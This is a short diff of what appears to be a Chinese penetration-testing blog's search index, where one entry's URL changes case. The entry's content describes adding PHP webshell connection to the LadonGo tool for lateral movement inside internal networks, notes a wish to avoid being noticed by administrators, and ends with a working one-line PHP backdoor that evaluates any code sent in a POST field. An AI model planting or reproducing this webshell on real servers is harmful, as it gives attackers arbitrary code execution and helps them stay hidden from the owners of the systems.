@@ -1221,7 +1221,7 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
   </entry>
   <entry>
     <title>〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码</title>
-    <url>/p/ladon_phpshell.html</url>
+    <url>/p/Ladon_phpshell.html</url>
     <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近VPS被人D比较卡，有时候M都不定连得上，或者连上了也难代理出来，所以需要一个命令行下连接内网WEBSHELL执行命令的工具，当然这个功能Ladon早有了。主要是因为在Linux下横向渗透连接内网其它机器执行命令，GO版还没有，所以先给LadonGo添加PHP一句话的连接功能，其它webshell有空再加。</p>
 <p>PS：其实主要是另一个原因，好像M在某个LNX环境下有问题，兼容性非常差有个BUG，NC或代理工具等可连网程序通过M执行后经常容易僵尸进程，出此意外得重启M或重启系统才行，而出现僵尸进程时又还显示网络连接时，很容易被管理员发现，所以代理等连网程序能不用就不用。</p>
 <h3 id="菜刀PHP一句话"><a href="#菜刀PHP一句话" class="headerlink" title="菜刀PHP一句话"></a>菜刀PHP一句话</h3><?php @eval($_POST[tom])?>
